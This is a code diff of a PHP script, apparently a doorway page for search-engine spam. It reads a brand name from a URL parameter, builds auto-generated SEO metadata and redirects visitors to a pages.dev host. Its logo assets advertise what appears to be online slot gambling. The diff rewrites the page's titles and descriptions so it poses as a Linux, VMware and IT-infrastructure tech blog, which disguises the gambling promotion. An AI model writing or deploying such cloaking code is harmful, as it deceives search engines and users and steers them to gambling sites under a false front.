@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x $BRAND2 - Mengenal Dunia Coding dan Teknologi Digital";
+    $title = "$BRAND x $BRAND2 - Referensi Teknologi untuk Linux, VMware, Jaringan, dan Infrastruktur IT";
 
-    $description = "$BRAND x $BRAND2 hadir sebagai sumber informasi seputar teknologi, coding, pemrograman, pengembangan web, aplikasi, dan berbagai wawasan digital untuk membantu meningkatkan keterampilan teknologi.";
+    $description = "$BRAND x $BRAND2 membahas Linux, Debian, VMware, jaringan, keamanan server, monitoring, DevOps, virtualisasi, dan berbagai teknologi infrastruktur IT melalui panduan teknis praktis.";
     
-    $artikel = "$BRAND x $BRAND2 dapat menjadi bagian dari ekosistem informasi digital yang membantu pembaca mengenal berbagai topik seputar teknologi, kode, pemrograman, pengembangan website, aplikasi, serta berbagai perkembangan dunia digital.";
+    $artikel = "$BRAND x $BRAND2 dapat diposisikan secara SEO sebagai referensi untuk berbagai pencarian seperti Cyberfront Tech Blog, tutorial Debian, Linux server, VMware tutorial, VMware Cloud Foundation, home lab, network security, Prometheus, Grafana, Pi-hole, AdGuard Home, server monitoring, DevOps, dan IT infrastructure.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/72/d5/b9/72d5b9d8bdab5f0bcdd31bffa4d56284.jpg";  
+    $image = "http://i.pinimg.com/1200x/be/80/24/be8024e9a599876754801b9a82199d27.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://tebarkode.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://blog-cyberfront.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
